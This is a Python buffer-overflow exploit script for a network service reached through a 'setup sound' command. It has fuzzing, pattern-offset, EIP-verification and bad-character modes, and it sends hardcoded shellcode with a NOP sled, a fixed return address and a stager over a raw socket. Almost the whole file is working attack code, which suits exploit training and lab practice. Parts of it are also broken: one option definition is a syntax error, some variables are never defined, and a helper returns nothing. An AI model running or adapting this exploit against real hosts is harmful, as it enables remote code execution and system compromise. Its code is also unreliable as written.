#!/usr/bin/python
import socket, time, sys, os
from optparse import OptionParser

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10""\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20""\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30""\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40""\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50""\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70""\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80""\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90""\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0""\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0""\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0""\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0""\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0""\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0""\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

def replace_payload(term, payload, inputBuffer):
    new_payload = payload.replace(bytes(term), bytes(inputBuffer))
    return new_payload.strip('\n')

def fuzz_find_buf_len(ip, port, payload, start_size, end_size):
    server = ip
    sport = port
        
    size = start_size

    while(size <= end_size):
        inputBuffer = "A" * int(size)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((server, int(sport)))
        print(s.recv(1024))
        print("Sending buffer of size {0} ".format(size))
        
        s.send((replace_payload('PAYLOAD', payload, inputBuffer)))
        print(s.recv(1024))
        s.close()
        size += 100
        time.sleep(5)
        print("\nDone!")

def get_msf_pattern(msf_length):

    print('Fuzzing with MSF pattern...')
    msfpattern = os.popen('msf-pattern_create -l ' + msf_length).read()
    # print('msf-pattern_create: {0}'.format(msfpattern))
    inputBuffer = msfpattern.strip('\n')

def get_buffer_verify_eip_overwrite(filler_len, buffer_len, eip):
    filler = "\x41" * filler_len
    buffer = "\x43" * buffer_len
    inputBuffer = filler + eip + buffer
    return inputBuffer

def get_staged_buffer(filler_len, eip, first_stage):
    padding = "\x41" * filler_len
    inputBuffer = padding + eip + first_stage
    return inputBuffer

def get_staged_payload(filler_len, eip, first_stage, nop_sled, shellcode):
    padding = "\x41"  * (filler_len - len(nop_sled) - len(shellcode))
    inputBuffer = nop_sled + shellcode + padding + eip + first_stage 
    return inputBuffer

def get_buffer_bad_characters(filler_len, buffer_len, eip, staged):
    filler = "\x41" * filler_len
    buffer = "\x43" * buffer_len
    if(staged == True):
        print("Staged buffer set...")
        inputBuffer = filler + badchars + eip + buffer
    else:
        inputBuffer = filler + eip + buffer + badchars
    return inputBuffer


def send_payload(ip, port, options):
    try:
        server = ip
        sport = port

        shellcode = ("\xdb\xde\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12"
"\xba\x32\x4d\x75\x0d\x83\xed\xfc\x31\x55\x13"
"\x03\x67\x5e\x97\xf8\xb6\xbb\xa0\xe0\xeb\x78"
"\x1c\x8d\x09\xf6\x43\xe1\x6b\xc5\x04\x91\x2a"
"\x65\x3b\x5b\x4c\xcc\x3d\x9a\x24\x0f\x15\x2b"
"\x17\xe7\x64\xd4\x74\xd2\xe1\x35\xca\x44\xa2"
"\xe4\x79\x3a\x41\x8e\x9c\xf1\xc6\xc2\x36\x64"
"\xe8\x91\xae\x10\xd9\x7a\x4c\x88\xac\x66\xc2"
"\x19\x26\x89\x52\x96\xf5\xca")

        payload = b"\x11(setup sound PAYLOAD\x90\x00#"

        eip = "\x96\x45\x13\x08"
        nop_sled = "\x90" * 8
        stager = "\x83\xc0\x0c\xff\xe0\x90\x90"

        if(options.fuzz != None):
            fuzz_find_buf_len(ip, port, payload, options.fuzz[0], options.fuzz[1])
            return

        if(options.fuzzpattern != None):
            #fuzz_with_pattern(sys.argv[1], sys.argv[2], payload, options.fuzzpattern)
            inputBuffer = get_msf_pattern(options.fuzzpattern)

        if(options.verifyeip != None):
            #verify_eip_overwrite(sys.argv[1], sys.argv[2], payload, options.verifyeip[0], options.verifyeip[1])
            inputBuffer = get_buffer_verify_eip_overwrite(options.verifyeip[0], options.verifyeip[1], eip)

        if(options.testbadchars != None):
            #fuzz_with_bad_characters(sys.argv[1], sys.argv[2], payload, options.testbadchars[0], options.testbadchars[1])
            if(options.stagedbuffer != None):
                staged = True
            else: 
                staged = False
            inputBuffer = get_buffer_bad_characters(options.testbadchars[0], options.testbadchars[1], eip, staged)
        
            

        if(options.sendpayload != None):
            #send_payload(sys.argv[1], sys.argv[2], payload, options.sendpayload[0], eip, options.sendpayload[1], shellcode)\
            if(options.stagedbuffer != None):
                print("Staged buffer set...")
                inputBuffer = get_staged_buffer(options.sendpayload[0], eip, stager)
            elif(options.exploitpayload != None):
                print("Sending exploit buffer...")
                inputBuffer = get_staged_payload(options.sendpayload[0], eip, stager, nop_sled, shellcode)
            else: 
                filler = "A" * filler_len
                #eip = '\xAF\x11\x50\x62'
                offset = "C" * offset_len
                nops = "\x90" * 10
                inputBuffer = filler + eip + offset + nops + shellcode 
        
        # buffer = "D" * (2500 - len(filler) - len(eip) - len(offset))
        
        print("Input buffer:\n {0}".format(inputBuffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((server, int(sport)))
        print(s.recv(1024))
        print("Sending buffer of size {0} ".format(len(inputBuffer)))
        s.send((replace_payload('PAYLOAD', payload, inputBuffer)))
        print(s.recv(1024))
        s.close()
        print("\nDone!")
    except Exception as e: 
        print(e)
        print("Could not connect!")
        sys.exit()

if len(sys.argv) <= 2:
    print("IP and Port are required! Basic usage: bof.py <ip-address> <destination-port>\nSee help for more")
    sys.exit(0)

#fuzz_find_buf_len(sys.argv[1], sys.argv[2])
usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser(usage=usage)
parser.add_option("-f", "--fuzz", dest="fuzz", type="int", nargs=2
                  help="Fuzz for length of buffer. Run with ./bof.py <ip> <port> -f <start_size> <end_size>", action="store")
parser.add_option("-p", "--fuzz-with-pattern",
                  action="store", dest="fuzzpattern",
                  help="Supply length of msf pattern. Run with ./bof.py <ip> <port> -f <length-for-msf-patten>")
parser.add_option("-v", "--verify",
                  action="store", dest="verifyeip", type="int", nargs=2,
                  help="Verify EIP is being overwritten with B's. Run with ./bof.py <ip> <port> -f <filler_len> <buffer_len>")
parser.add_option("-t", "--test-bad-characters",
                  action="store", dest="testbadchars", type="int", nargs=2,
                  help="Test bad characters. Add -g to specify a staged payload. Run with ./bof.py <ip> <port> -f <filler_len> <buffer_len>")
parser.add_option("-s", "--send-payload",
                  action="store", dest="sendpayload", type="int", nargs=2,
                  help="Send shellcode payload to target. Run with ./bof.py <ip> <port> -f <filler_len> <offset_len>" )
parser.add_option("-g", "--send-stage-payload",
                  action="store_false", dest="stagedbuffer",
                  help="Set this flag if you're sending a staged payload" )
parser.add_option("-e", "--exploit",
                  action="store_false", dest="exploitpayload",
                  help="Set this flag if you're sending a staged payload exploit" )

(options, args) = parser.parse_args()

send_payload(sys.argv[1], sys.argv[2], options)

